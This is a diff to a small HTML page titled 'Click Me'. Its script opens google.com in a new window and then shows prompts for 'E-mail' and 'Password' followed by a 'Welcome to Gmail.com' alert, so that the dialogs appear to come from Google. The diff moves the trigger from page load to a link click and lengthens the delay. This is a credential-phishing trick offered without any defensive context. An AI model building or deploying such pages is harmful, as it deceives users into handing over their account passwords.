@@ -1,9 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Test page</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Click Me</title>
 </head>
 <body>
+  <a href="#" onclick="go2(); return false;">Click Me</a>
+  
   <script>
     function go2() { 
       var x = window.open('https://google.com'); 
@@ -12,12 +16,8 @@
         x.prompt('E-mail', '');
         b = x.prompt('Password', '');
         x.alert('Welcome to Gmail.com');
-      }, 10);
+      }, 1000);
     }
-
-    window.onload = function() {
-      go2();
-    };
   </script>
 </body>
 </html>
